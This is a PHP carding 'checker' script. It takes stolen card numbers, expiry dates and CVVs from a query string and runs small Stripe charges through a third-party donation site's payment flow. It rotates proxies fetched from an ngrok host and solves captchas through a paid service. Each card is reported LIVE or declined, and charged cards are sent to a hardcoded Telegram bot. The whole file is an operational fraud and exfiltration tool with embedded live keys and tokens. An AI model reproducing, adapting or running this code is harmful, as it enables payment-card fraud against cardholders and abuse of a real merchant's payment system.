<?php/error_reporting(0);
$time_start = microtime(true);
set_time_limit(200);
//include(getcwd()."/tools/proxyClass.php");
//$proxy = new tools\proxyClass();


// include("firstDataMessage.php");
function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


function RandomString($length = 16)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function cURLc($url, $headers, $postfields, $customrequest) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        // CURLOPT_SSL_VERIFYPEER => 1,
        // CURLOPT_SSL_VERIFYHOST => 1,
        // CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
function cURL($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        // CURLOPT_SSL_VERIFYPEER => 0,
        // CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

$ips = file_get_contents("https://magic.bins.ngrok.io/io.php/");
function cURL_ProxyOn($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        // CURLOPT_PROXY => "http://scraperapi.session_number=$port.ultra_premium=true.country_code=uk:f73965b26e9d8457634c8b1597c0e6da@proxy-server.scraperapi.com:8001/",
        CURLOPT_PROXY => "$ips",
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
extract($_GET);
$separator = explode("|", $lista);
$amnt = 1;
$cc = $separator[0];
$ccbin = substr($cc, 0,6);
$mm = $separator[1];
$yy = $separator[2];
$yy1 = substr($yy, 2,2);
$cvv = $separator[3];
$cookie = RandomString();
$cbin = substr($cc, 0,1);
$rnum = rand(1111,9999);
$str = substr(randomString(), 0,7);
$email = $str."@gmail.com";
if($cbin == 5){
    $cbin = 'masterCard';
}
else if($cbin == 4){
    $cbin = 'visa';
}
$sessionProxy =  $proxy::RandomProxy();
function solveCaptcha($site,$siteKey,$clientKey){
    $createTask =  cURLc(
        "https://api.capmonster.cloud/createTask",
        $headers = [
            "Content-Type: application/json",
            "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","task":{"type":"NoCaptchaTaskProxyless","websitUSDL":"'.$site.'","websiteKey":"'.$siteKey.'"}}',
        "POST"
    );
    $taskId = getstr(json_encode($createTask,true),'"taskId\":','}');
    $status = "processing";
    $gResponse = "";
    while ($status == "processing") {
        sleep(3);
        $getTaskResult =  cURLc(
            "https://api.capmonster.cloud/getTaskResult ",
            $headers = [
                "Content-Type: application/json",
                "accept: application/json"
            ],
            '{"clientKey":"'.$clientKey.'","taskId": '.$taskId.'}',
            "POST"
        );
        $status = getstr($getTaskResult,'"status":"','"');
        $gResponse = getstr($getTaskResult,'"gRecaptchaResponse":"','"');}
    return $getTaskResult ;
}
// $port = rand(10000, 11000);
function get_bankinfo($ccbins){
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://binov.net/",
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => [
            "Content-Type: application/x-www-form-urlencoded",
            "Referer: https://binov.net/",
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32'
        ],
        CURLOPT_POSTFIELDS => "BIN=$ccbins"
    ));
    $g_ccdets = curl_exec($ch);
    $cc_type0 = GetStr($g_ccdets, "$cc_bin</td><td>" , '</td>');
    $cc_bname = GetStr($g_ccdets, "$cc_type0</td><td>" , '</td>');
    $cc_type1 = GetStr($g_ccdets, "$cc_bname</td><td>" , '</td>');
    $cc_type2 = GetStr($g_ccdets, "$cc_type1</td><td>" , '</td>');
    $cc_country = GetStr($g_ccdets, "$cc_type2</td><td>" , '</td>');
    // return array($cc_type0 => $cc_type0, $cc_bname => $cc_bname, $cc_type1 => $cc_type1, $cc_type2 => $cc_type2, $cc_country => $cc_country);
    $CC_fDets = "Bank: $cc_bname Country: $cc_country";
    return  $CC_fDets;
}
$cookie = randomString();
$trans_completed = false;
$tries = 0;
$limit = 3;
while ($trans_completed == false && $tries < $limit) {
    $tries = $tries + 1;
// 	# code...
    $page = cURL_ProxyOn(
        "https://bidem.org/?asp_action=show_pp&product_id=640",
        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'
        ],
        "",
        "GET",
        1,
        $cookie,
        $sessionProxy

    );
    $confirm = GetStr($page, '"asp_pp_ajax_nonce":"', '"');
    $create_pi = GetStr($page, '"asp_pp_ajax_create_pi_nonce":"', '"');

    $get_id = cURL(
        "https://m.stripe.com/6",
        $headers = [
            'accept: */*',
            'content-type: text/plain;charset=UTF-8',
            'origin: https://m.stripe.network',
            'referer: https://m.stripe.network/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'
        ],
        "",
        "POST",
        1,
        $cookie
    );
    $muid = GetStr($get_id, '"muid":"', '"');
    $guid = GetStr($get_id, '"guid":"', '"');
    $sid = GetStr($get_id, '"sid":"', '"');
    if (empty($guid)){
        $guid = "N/A";
    }
    if (empty($muid)){
        $muid = "N/A";
    }
    if (empty($sid)){
        $sid = "N/A";
    }
        $ajax_create_pi = cURL_ProxyOn(
        "https://bidem.org/wp-admin/admin-ajax.php",
        $headers = [
            "accept: */*",
            "content-type: application/x-www-form-urlencoded",
            "referer: https://bidem.org/?asp_action=show_pp&product_id=640",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
        ],
        'action=asp_pp_req_token&amount=100&curr=CAD&product_id=640&quantity=1&billing_details={"name":"'.$str.' '.$str.'","email":"'.$email.'"}&token=7820c4b40a6a9b429156a6126a140ad7',
        "POST",
        1,
        $cookie
    );
    $pi_id = GetStr($ajax_create_pi, '"pi_id":"', '"');
    $secret = GetStr($ajax_create_pi, '"clientSecret":"', '"');
    $cus = GetStr($ajax_create_pi, '"cust_id":"', '"');

          $execute = cURL_ProxyOn(
        "https://api.stripe.com/v1/payment_intents/$pi_id/confirm",
        $headers = [
            'accept: application/json',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://js.stripe.com',
        ],
        "save_payment_method=true&setup_future_usage=off_session&receipt_email=$email.com&payment_method_data%5Btype%5D=card&payment_method_data%5Bbilling_details%5D%5Bname%5D=$str%2BGamboa&payment_method_data%5Bbilling_details%5D%5Bemail%5D=$email.com&payment_method_data%5Bcard%5D%5Bnumber%5D=$cc&payment_method_data%5Bcard%5D%5Bexp_month%5D=$mm&payment_method_data%5Bcard%5D%5Bexp_year%5D=$yy1&payment_method_data%5Bguid%5D=$guid&payment_method_data%5Bmuid%5D=$muid&payment_method_data%5Bsid%5D=$sid&payment_method_data%5Bpayment_user_agent%5D=stripe.js%2Ff0346bf10%3B%2Bstripe-js-v3%2Ff0346bf10&payment_method_data%5Btime_on_page%5D=14163&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51H2EJrGnjkS3RdQbq0wblYc9RLyxqQwGwtSXcXeagwYjwuND1XDZc882wx2j7xTsfRaLfUApJVHmBOyA6sq5vtCS00UDheMdUX&client_secret=$secret",
        "POST",
        1,
        $cookie
    );

    if (strpos($execute,'"type": "card_error"') || strpos($execute,'status": "succeeded"')){
        $trans_completed = true;
    }else{
        $trans_completed = false;
    }
}
$response = GetStr($execute, '"message": "', '"');
$dcode = GetStr($execute, '"code": "', '"');

        if (strpos($execute, 'status": "succeeded"')){
        $cc_info = get_bankinfo($ccbins);
        echo '<tr><td><span class="badge bg-success">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">' . $lista . '</span></td> <td><span class="badge badge-success badge-pill">Charged[' . $amnt . '.00]$</span> <span class="badge bg-light text-dark">' . $CC_fDets . '</span></td></tr><br>';
        file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text=' . $lista . ' CHARGED CCN - STRPE GATE');
        $res = '"MESSAGE": "Approved" <br>';
    } elseif (strpos($execute,'"type": "card_error"')) {
        echo '<tr><td><span class="badge badge-dark badge-pill">' . $lista . '</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill"> "MESSAGE": "' . urldecode($response) . '" - Retries: ' . $retries . '</span></td><td><span class="badge badge-info badge-pill"> INFO: ' . $sessionProxy . ' Took ' . number_format(microtime(true) - $time_start, 2) . ' seconds</span></td></tr><br>';
        $res = '<br> "MESSAGE": "' . $response . '" <br>';

    } else {
        echo '<tr><td><span class="badge badge-dark badge-pill">' . $lista . '</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">Processing unsuccessful(May be Merchant is dead or network is blocked) - Retries: ' . $retries . '</span></td><td><span class="badge badge-info badge-pill"> INFO: ' . $sessionProxy . ' Took ' . number_format(microtime(true) - $time_start, 2) . ' seconds</span></td></tr><br>';
    }




unlink("cookies/$cookie.txt");

?>